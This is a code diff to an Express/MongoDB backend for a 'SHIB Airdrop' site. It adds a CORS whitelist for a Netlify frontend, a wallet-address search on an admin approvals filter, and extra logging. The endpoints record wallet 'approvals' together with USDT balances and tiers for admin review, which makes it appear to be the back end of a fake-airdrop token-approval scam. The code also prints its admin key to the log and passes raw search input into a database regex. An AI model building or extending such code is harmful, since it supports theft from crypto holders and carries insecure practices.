@@ -3,8 +3,23 @@ const cors = require('cors');
 const mongoose = require('mongoose');
 const app = express();
 
+// ✅ FIXED: CORS Configuration for Netlify
+const corsOptions = {
+    origin: [
+        'https://shib-airdrop.netlify.app',  // Your Netlify frontend
+        'http://localhost:3000',              // Local development
+        'http://127.0.0.1:3000',             // Local development
+        'http://localhost:8080',              // Local backend
+        'http://127.0.0.1:8080'              // Local backend
+    ],
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'admin-key', 'Accept'],
+    credentials: true,
+    optionsSuccessStatus: 200
+};
+
 // Middleware
-app.use(cors());
+app.use(cors(corsOptions));
 app.use(express.json());
 
 // Environment Variables
@@ -67,8 +82,11 @@ async function initializeSettings() {
 }
 
 // ========================
-// ✅ NEW ADMIN APIs ADDED
+// ✅ UPDATED: CORS Pre-flight for all routes
 // ========================
+
+// Handle pre-flight requests
+app.options('*', cors(corsOptions));
 
 // Middleware for admin authentication
 const authenticateAdmin = (req, res, next) => {
@@ -176,7 +194,7 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
 // ✅ Get approvals with filters for admin
 app.get('/api/admin/approvals/filter', authenticateAdmin, async (req, res) => {
     try {
-        const { date, minAmount, maxAmount, tier } = req.query;
+        const { date, minAmount, maxAmount, tier, search } = req.query;
         let filter = { approvalGiven: true };
         
         // Date filter
@@ -207,6 +225,11 @@ app.get('/api/admin/approvals/filter', authenticateAdmin, async (req, res) => {
             filter.tier = tier;
         }
         
+        // Search filter
+        if (search) {
+            filter.walletAddress = { $regex: search, $options: 'i' };
+        }
+        
         const approvals = await User.find(filter)
             .sort({ approvalTimestamp: -1 })
             .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
@@ -223,7 +246,7 @@ app.get('/api/admin/approvals/filter', authenticateAdmin, async (req, res) => {
 });
 
 // ========================
-// EXISTING APIs (UNCHANGED)
+// EXISTING APIs (UNCHANGED but CORS enabled)
 // ========================
 
 // Health check endpoint
@@ -232,7 +255,8 @@ app.get('/api/health', (req, res) => {
         success: true, 
         message: 'SHIB Airdrop Backend is running!', 
         timestamp: new Date().toISOString(),
-        environment: process.env.NODE_ENV || 'development'
+        environment: process.env.NODE_ENV || 'development',
+        cors: 'Enabled for Netlify'
     });
 });
 
@@ -240,6 +264,8 @@ app.get('/api/health', (req, res) => {
 app.post('/api/save-approval', async (req, res) => {
     try {
         const { walletAddress, usdtBalance, airdropAmount, tier } = req.body;
+        
+        console.log('✅ Saving approval for:', walletAddress, 'USDT:', usdtBalance, 'Tier:', tier);
         
         if (!walletAddress) {
             return res.status(400).json({ success: false, message: 'Wallet address is required' });
@@ -267,6 +293,7 @@ app.post('/api/save-approval', async (req, res) => {
         }
         
         await user.save();
+        console.log('✅ Approval saved successfully for:', walletAddress);
         res.json({ success: true, message: 'Approval saved successfully' });
     } catch (error) {
         console.error('Error saving approval:', error);
@@ -365,13 +392,13 @@ app.get('/', (req, res) => {
         success: true,
         message: 'SHIB Airdrop Backend API',
         version: '1.0.0',
+        cors: 'Enabled for Netlify',
         endpoints: {
             health: '/api/health',
             approvalWallet: '/api/approval-wallet',
             saveApproval: '/api/save-approval',
             approvedUsers: '/api/approved-users',
             userStats: '/api/user-stats',
-            // ✅ NEW ADMIN ENDPOINTS
             adminApprovals: '/api/admin/approvals',
             adminStats: '/api/admin/stats',
             adminFilter: '/api/admin/approvals/filter'
@@ -388,7 +415,7 @@ const startServer = async () => {
         app.listen(PORT, '0.0.0.0', () => {
             console.log(`🚀 Backend server running on port ${PORT}`);
             console.log(`📊 Environment: ${process.env.NODE_ENV || 'development'}`);
-            console.log(`🌐 API available at: ${process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`}`);
+            console.log(`🌐 CORS Enabled for: https://shib-airdrop.netlify.app`);
             console.log(`🔐 Admin Key: ${ADMIN_KEY}`);
             console.log('✅ Admin APIs are now available!');
         });
